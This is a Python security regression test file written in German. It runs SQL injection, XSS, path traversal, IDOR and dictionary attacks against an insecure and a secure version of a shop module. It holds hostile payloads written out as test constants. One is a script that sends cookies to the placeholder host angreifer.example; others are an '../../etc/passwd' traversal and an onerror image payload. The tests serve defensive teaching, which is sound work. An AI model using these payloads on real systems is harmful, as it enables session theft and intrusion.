"""Sicherheitstests: Jeder Angriff wird gegen beide Varianten ausgeführt.

Aufruf:  python -m unittest -v

- UnsicherTests zeigt, dass die Angriffe gegen unsicher.py FUNKTIONIEREN (Schwachstelle nachgewiesen).
- SicherTests zeigt, dass dieselben Angriffe gegen sicher.py SCHEITERN – und dass die normale
  Funktion trotzdem erhalten bleibt. Genau solche Tests schützen in echten Projekten davor,
  dass eine behobene Lücke später wieder auftaucht (Sicherheits-Regressionstests).
"""

import tempfile
import time
import unittest
from pathlib import Path

import datenbank
import sicher
import unsicher

SQL_INJECTION = "admin' --"  # beendet den String und kommentiert den Rest der Abfrage aus
XSS = "<script>fetch('https://angreifer.example/?c='+document.cookie)</script>"
PATH_TRAVERSAL = "../geheim.txt"
WOERTERBUCH = ["123456", "passwort", "Passwort1", "hallo123", "Sommer2025", "Sommer2026", "Winter2026"]


def woerterbuchangriff(modul, gespeichert):
    """Probiert jedes Wort aus – so arbeiten Werkzeuge wie hashcat oder John the Ripper, nur viel langsamer."""
    for wort in WOERTERBUCH:
        if modul.passwort_pruefen(wort, gespeichert):
            return wort
    return None


class GemeinsameTests:
    """Fachliche Tests, die für beide Varianten gelten müssen."""

    modul = None

    def setUp(self):
        self.db = datenbank.erstellen(self.modul.passwort_hashen)
        self.ordner = tempfile.TemporaryDirectory()
        wurzel = Path(self.ordner.name)
        (wurzel / "oeffentlich").mkdir()
        (wurzel / "oeffentlich" / "hilfe.txt").write_text("Hilfe zum Shop", encoding="utf-8")
        (wurzel / "geheim.txt").write_text("DB_PASSWORT=nur-ein-beispiel", encoding="utf-8")
        self.basis = wurzel / "oeffentlich"

    def tearDown(self):
        self.db.close()
        self.ordner.cleanup()

    def hash_von(self, name):
        return self.db.execute("SELECT passwort_hash FROM benutzer WHERE name = ?", (name,)).fetchone()[0]

    def test_anmeldung_mit_richtigem_passwort(self):
        self.assertEqual(self.modul.anmelden(self.db, "anna", "Sommer2026"), "anna")

    def test_anmeldung_mit_falschem_passwort(self):
        self.assertIsNone(self.modul.anmelden(self.db, "anna", "falsch"))

    def test_eigene_bestellung_lesen(self):
        self.assertEqual(self.modul.bestellung_holen(self.db, "anna", 1), (1, "anna", "Monitor"))

    def test_erlaubte_datei_lesen(self):
        self.assertEqual(self.modul.datei_lesen(self.basis, "hilfe.txt"), "Hilfe zum Shop")

    def test_normaler_kommentar(self):
        self.assertEqual(self.modul.kommentar_html("anna", "Tolles Buch"), "<p><b>anna</b>: Tolles Buch</p>")


class UnsicherTests(GemeinsameTests, unittest.TestCase):
    """Nachweis der Schwachstellen: Diese Tests sind grün, WEIL die Angriffe funktionieren."""

    modul = unsicher

    def test_sql_injection_meldet_ohne_passwort_als_admin_an(self):
        self.assertEqual(unsicher.anmelden(self.db, SQL_INJECTION, "egal"), "admin")

    def test_xss_skript_landet_ausfuehrbar_im_html(self):
        self.assertIn("<script>", unsicher.kommentar_html("mallory", XSS))

    def test_path_traversal_liest_datei_ausserhalb_des_ordners(self):
        self.assertIn("DB_PASSWORT", unsicher.datei_lesen(self.basis, PATH_TRAVERSAL))

    def test_idor_fremde_bestellung_lesbar(self):
        # ben ist angemeldet und ändert in der URL einfach die ID: /bestellungen/1
        self.assertEqual(unsicher.bestellung_holen(self.db, "ben", 1)[1], "anna")

    def test_gleiches_passwort_gleicher_hash(self):
        # Ohne Salt sieht man sofort, wer dasselbe Passwort hat – und vorberechnete Tabellen funktionieren.
        self.assertEqual(unsicher.passwort_hashen("Sommer2026"), unsicher.passwort_hashen("Sommer2026"))

    def test_woerterbuchangriff_knackt_schwaches_passwort(self):
        self.assertEqual(woerterbuchangriff(unsicher, self.hash_von("anna")), "Sommer2026")


class SicherTests(GemeinsameTests, unittest.TestCase):
    """Dieselben Angriffe müssen hier scheitern."""

    modul = sicher

    def test_sql_injection_scheitert(self):
        self.assertIsNone(sicher.anmelden(self.db, SQL_INJECTION, "egal"))

    def test_unbekannter_benutzer(self):
        self.assertIsNone(sicher.anmelden(self.db, "mallory", "egal"))

    def test_xss_wird_kodiert(self):
        ausgabe = sicher.kommentar_html("mallory", XSS)
        self.assertNotIn("<script>", ausgabe)
        self.assertIn("&lt;script&gt;", ausgabe)

    def test_xss_im_autornamen_wird_kodiert(self):
        self.assertNotIn("<img", sicher.kommentar_html('<img src=x onerror="alert(1)">', "Hallo"))

    def test_path_traversal_wird_verweigert(self):
        for angriff in (PATH_TRAVERSAL, "../../etc/passwd", str(Path(self.ordner.name) / "geheim.txt")):
            with self.subTest(angriff=angriff), self.assertRaises(PermissionError):
                sicher.datei_lesen(self.basis, angriff)

    def test_fremde_bestellung_nicht_lesbar(self):
        self.assertIsNone(sicher.bestellung_holen(self.db, "ben", 1))

    def test_fremde_und_fehlende_bestellung_sehen_gleich_aus(self):
        self.assertEqual(sicher.bestellung_holen(self.db, "ben", 1), sicher.bestellung_holen(self.db, "ben", 999))

    def test_gleiches_passwort_verschiedener_hash_durch_salt(self):
        self.assertNotEqual(sicher.passwort_hashen("Sommer2026"), sicher.passwort_hashen("Sommer2026"))

    def test_hash_enthaelt_kein_klartextpasswort(self):
        self.assertNotIn("Sommer2026", sicher.passwort_hashen("Sommer2026"))

    def test_jeder_rateversuch_ist_viel_teurer_als_bei_md5(self):
        def dauer(modul, anzahl):
            gespeichert = modul.passwort_hashen("x")
            start = time.perf_counter()
            for _ in range(anzahl):
                modul.passwort_pruefen("y", gespeichert)
            return (time.perf_counter() - start) / anzahl

        self.assertGreater(dauer(sicher, 5) / dauer(unsicher, 2000), 100)

    def test_schwaches_passwort_bleibt_trotzdem_schwach(self):
        # Ehrliche Grenze: Langsames Hashing macht jeden Versuch teuer, rettet aber kein Passwort,
        # das in jeder Wortliste steht. Dagegen helfen Sperrlisten, Anmeldelimits und MFA.
        self.assertEqual(woerterbuchangriff(sicher, self.hash_von("anna")), "Sommer2026")


if __name__ == "__main__":
    unittest.main()
